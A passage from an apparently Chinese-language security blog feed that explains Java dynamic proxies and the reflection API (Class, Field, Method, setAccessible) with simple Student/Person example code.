class="built_in">this</span>.count+=<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;已收作业数量:&quot;</span>+<span class="built_in">this</span>.count);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当调用<strong>代理对象</strong>的方法时就会触发invoke方法，触发该invoke方法的前提条件：</p><ul><li><p><strong>代理对象需基于接口动态生成，并绑定 <code>InvocationHandler</code>。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyHandler</span>(s1);</span><br><span class="line"><span class="type">Event</span> <span class="variable">proxy</span> <span class="operator">=</span> (Event) Proxy.newProxyInstance(</span><br><span class="line">    target.getClass().getClassLoader(),</span><br><span class="line">    target.getClass().getInterfaces(), <span class="comment">// 必须实现至少一个接口</span></span><br><span class="line">    handler <span class="comment">// InvocationHandler 实例</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p><strong>调用的方法必须属于代理接口</strong></p></li><li><p><strong>方法调用必须通过代理对象发起</strong></p></li></ul><p>这里我们设置一个动态代理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyHandler</span>(s1); <span class="comment">//由于是接口类型不能使用自定义方法setStudent()切换代理对象</span></span><br><span class="line">        <span class="type">Event</span> <span class="variable">proxyHello</span> <span class="operator">=</span> (Event) Proxy.newProxyInstance(s1.getClass().getClassLoader(), s1.getClass().getInterfaces(), handler);  <span class="comment">//设置代理对象</span></span><br><span class="line">        proxyHello.SubmitWork();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">张三提交作业</span><br><span class="line">已收作业数量:1</span><br></pre></td></tr></table></figure><p>其中调用<code>Proxy.newProxyInstance()</code>时，JVM首先会根据传入的<code>interfaces</code>接口列表，动态生成一个<strong>新的类（代理类）</strong>，该类会实现<strong>所有指定的接口</strong>。然后使用传入<code>ClassLoader</code>类加载器加载生成的代理类字节码，将其定义为<strong>新的Java类</strong>，最后通过反射调用代理类的构造函数，传入调用处理器<code>handler</code>，创建代理对象。</p><p>当调用<code>proxyHello.SubmitWork();</code>触发invoke方法，object代理对象为<code>proxyHello</code>，args为<code>null</code>，即调用我们的<code>proxyHello.Submitwork()</code></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html">https://www.cnblogs.com/gonjan-blog/p/6685611.html</a></p><p><a href="https://nivi4.notion.site/Java-b97e232be04941a7860206a0e908f2cd">https://nivi4.notion.site/Java-b97e232be04941a7860206a0e908f2cd</a></p><p><a href="https://liaoxuefeng.com/books/java/reflection/proxy/index.html">https://liaoxuefeng.com/books/java/reflection/proxy/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射</title>
      <link href="/2025/03/30/Java%E5%8F%8D%E5%B0%84/"/>
      <url>/2025/03/30/Java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h2 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h2><p>java动态特性：一段代码，改变其中的变量，将会使这段代码产生功能性的变化。</p><p>Java反射机制是指在运行状态时，对于任意一个类，都能够获取这个类的所有属性和方法；对于一个对象，都能够调用它的任意一个方法和属性（包括私有方法和属性），这种动态获取信息以及动态调用对象方法的功能就称为Java的反射机制。</p><p>通过使用反射我们不仅可以获取到任何类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);          <span class="comment">// 动态加载类</span></span><br><span class="line">    clazz.getMethod(methodName)                      <span class="comment">// 获取方法对象</span></span><br><span class="line">         .invoke(clazz.newInstance());              <span class="comment">// 创建实例并调用方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/30/Java%E5%8F%8D%E5%B0%84/20210309150130.webp"></p><p>可以看到当我们创建一个类文件后，经过javac编译，就会形成<code>.class</code>文件，同时jvm内存会查找生成的<code>.class</code>文件读入内存和经过ClassLoader加载，同时会创建生成一个Class对象，里面拥有其获取的成员变量，成员方法和构造方法等。</p><h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><p>JVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息。如果获取了某个Class实例，就可以通过这个Class实例获取到该实例对应的class的所有信息</p><ul><li><p>如果已经加载了某个类，就可以通过一个class的静态变量class获得。使用**.class来创建Class对象<strong>的引用时，</strong>不会自动初始化该Class对象**。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> String.class;</span><br></pre></td></tr></table></figure><blockquote><p>未初始化该Class对象，不会触发静态代码块和静态变量赋值。</p></blockquote></li><li><p>如果<strong>上下文中存在某个类的实例，可以通过该实例变量提供的<code>getClass()</code>方法获取</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        String s=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">        Class cls=s.getClass();</span><br><span class="line">        </span><br><span class="line">        System.out.println(cls.getName());  <span class="comment">//获取类名，输出java.lang.String</span></span><br><span class="line">        System.out.println(cls.getSimpleName()); </span><br><span class="line"></span><br><span class="line">        System.out.println(cls == String.class);  <span class="comment">//检查Class对象是否表示String类，输出true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>此时获取的是已知实例的class对象，所以已初始化</p></blockquote></li><li><p>知道一个class的完整类名，可以通过静态方法<code>Class.forName()</code>获取。使用<code>forName()</code>会初始化该Class对象，即会<strong>触发静态代码块和静态变量赋值</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls=Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><p>foaName有两个函数重载：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; cls=Class.forName(String name)</span><br><span class="line">Class&lt;?&gt; cls=Class.forName(String name, **<span class="type">boolean</span>** initialize, ClassLoader loader)</span><br></pre></td></tr></table></figure><blockquote><p><code>Class&lt;?&gt;</code>表示某个未知类型的对象，泛型<code>&lt;?&gt;</code>是为了保证类型安全，避免强制类型转换的风险</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line"><span class="comment">//等于</span></span><br><span class="line">Class.forName(className,<span class="literal">true</span>,currentLoader)</span><br></pre></td></tr></table></figure><blockquote><p>name指定加载的类名，initialize指定是否初始化，loader指定类加载器，若为null，默认使用系统类加载器</p></blockquote><p>第二个参数表示是否初始化，<strong>在forName的时候，构造函数并不会执行，而是执行类初始化。他会先执行<code>static&#123;&#125;</code>静态块里的内容：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyClass</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, LazyClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LazyClass</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">LazyClass</span> <span class="variable">train</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LazyClass</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/30/Java%E5%8F%8D%E5%B0%84/QQ20250329-230043.png"></p><p>可以看到，当实例化这个类时，首先调用的是静态块<code>static&#123;&#125;</code>，其次是实例块<code>&#123;&#125;</code>，最后是构造函数。其中<code>static&#123;&#125;</code>就是在类初始化的时候调用的</p><blockquote><p>静态块是类加载时执行一次，实例块是每次实例化时执行，构造函数也是每次实例化时执行</p></blockquote><p>而由于Class实例在JVM中是唯一的，所以，上诉方法获取的Class实例是同一个实例</p><h2 id="Field类"><a href="#Field类" class="headerlink" title="Field类"></a>Field类</h2><h3 id="访问字段"><a href="#访问字段" class="headerlink" title="访问字段"></a>访问字段</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Field <span class="title function_">getField</span><span class="params">(name)</span>: 根据字段名获取某个<span class="keyword">public</span>的field(包括父类)</span><br><span class="line">Field <span class="title function_">getDeclaredField</span><span class="params">(name)</span>: 根据字段名获取当前类的某个field(不包括父类)</span><br><span class="line">Field[] getFielads(): 获取所有<span class="keyword">public</span>的field(包括父类)</span><br><span class="line">Field[] getDeclaredFields(): 获取当前类的所有field(不包括父类)</span><br></pre></td></tr></table></figure><p>Demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class stdClass=Student.class;</span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">        System.out.println(stdClass.getDeclaredField(<span class="string">&quot;score&quot;</span>));</span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> Person.age</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> Student.score</span><br><span class="line"><span class="keyword">public</span> java.lang.String Person.name</span><br></pre></td></tr></table></figure><p>一个Field对象包含了一个字段的所有信息：</p><ul><li><code>getName()</code>：返回字段名称</li><li><code>getType()</code>：返回字段类型，也是一个Class实例</li><li><code>getModifiers()</code>：返回字段修饰符</li><li><code>get(obj)</code>：获取字段值</li><li>set：修改字段值</li></ul><h3 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h3><p>在Java反射机制中，主要通过<code>Field.get(Object obj)</code>来获取字段值，而字段值是存储在对象实例中的，因此我们要通过反射获取或修改某个字段值时，必须明确操作的具体对象实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Person std=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        Class stdClass=std.getClass();</span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;score&quot;</span>).get(stdClass.newInstance()));</span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;name&quot;</span>).get(stdClass.newInstance()));</span><br><span class="line">        System.out.println(stdClass.getDeclaredField(<span class="string">&quot;grade&quot;</span>).get(stdClass.newInstance()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span>  <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade=<span class="number">90</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>stdClass.getField(“score”)用于获取字段对象，注意stdClass是一个对象而并非实例，所以需要创建一个实例</p></blockquote><p>但我们会发现，上面代码无法获取private字段，会抛出<code>IllegalAccessException</code>错误，这是因为没有访问权限</p><p>在访问私有字段前，我们可以<strong>通过设置<code>Field.setAccessible(true)</code>强制开启访问权限</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Person std=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        Class stdClass=std.getClass();</span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;score&quot;</span>).get(stdClass.newInstance()));</span><br><span class="line">        System.out.println(stdClass.getField(<span class="string">&quot;name&quot;</span>).get(stdClass.newInstance()));</span><br><span class="line">        Field f=stdClass.getDeclaredField(<span class="string">&quot;grade&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(f.get(stdClass.newInstance()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span>  <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade=<span class="number">90</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">100</span></span><br><span class="line"><span class="comment">b1uel0n3</span></span><br><span class="line"><span class="comment">90</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="修改字段值"><a href="#修改字段值" class="headerlink" title="修改字段值"></a>修改字段值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> stdClass.getDeclaredField(<span class="string">&quot;grade&quot;</span>);</span><br><span class="line">f.set(obj, <span class="string">&quot;xxxx&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>修改和读取的实例要相同，<code>stdClass.newInstance()</code> 每次调用都会创建一个新的 <code>Student</code> 实例。所以不要<code>f.set(f.get(stdClass.newInstance()),50);</code></p></blockquote><p>如果修改非<code>public</code>字段，需要先调用<code>setAccessible(true)</code>开启访问权限</p><h2 id="Method类"><a href="#Method类" class="headerlink" title="Method类"></a>Method类</h2><h3 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Method <span class="title function_">getMethod</span><span class="params">(name,Class...)</span>: 获取某个<span class="keyword">public</span>的Method(包括父类)</span><br><span class="line">Method <span class="title function_">getDeclaredMethod</span><span class="params">(name,Class...)</span>: 获取当前类的某个Method(不包括父类)</span><br><span class="line">Method[] getMethods(): 获取所有<span class="keyword">public</span>的Method(包括父类)</span><br><span class="line">Method[] getDeclaredMethods(): 获取当前类的所有Method(不包括父类)</span><br></pre></td></tr></table></figure><p>Demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=Student.class;</span><br><span class="line">        System.out.println(cls.getMethod(<span class="string">&quot;getName&quot;</span>, String.class));</span><br><span class="line">        System.out.println(cls.getMethod(<span class="string">&quot;getScore&quot;</span>, String.class));</span><br><span class="line">        System.out.println(cls.getDeclaredMethod(<span class="string">&quot;getGrade&quot;</span>, <span class="type">int</span>.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span>  <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getScore</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getGrade</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">(String m)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> java.lang.String Person.getName(java.lang.String)</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> Student.getScore(java.lang.String)</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> Student.getGrade(<span class="type">int</span>)</span><br></pre></td></tr></table></figure><p>一个Method对象包含一个方法的所有信息：</p><ul><li><code>getName()</code>: 返回方法名称</li><li><code>getReturnType()</code>: 返回方法返回值类型，也是一个Class实例</li><li><code>getParameterTypes()</code>: 返回方法的参数类型，是一个Class数组</li><li><code>getModifiers()</code>: 返回方法的修饰符</li></ul><h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><p><code>invoke</code>：调用方法</p><p><code>invoke</code>用于执行方法，它的第一个参数是：</p><ul><li><p><strong>如果这个方法是一个实例方法，那么第一个参数是实例对象</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Student.class.getMethod(<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">method.invoke(student);</span><br></pre></td></tr></table></figure></li><li><p><strong>如果第一个方法是静态方法，那么第一个参数是类</strong></p></li></ul><p>这里用substring举个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String name=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">substring</span> <span class="operator">=</span> String.class.getMethod(<span class="string">&quot;substring&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">        System.out.println(substring.invoke(name,<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//el0n3</span></span><br></pre></td></tr></table></figure><h3 id="调用非public方法"><a href="#调用非public方法" class="headerlink" title="调用非public方法"></a>调用非public方法</h3><p>同样需要通过<code>getAccessible(true)</code>允许调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=Student.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>, String.class);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m.invoke(cls.newInstance(),<span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//输出hello b1uel0n3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> score;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> grade;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        System.out.println(<span 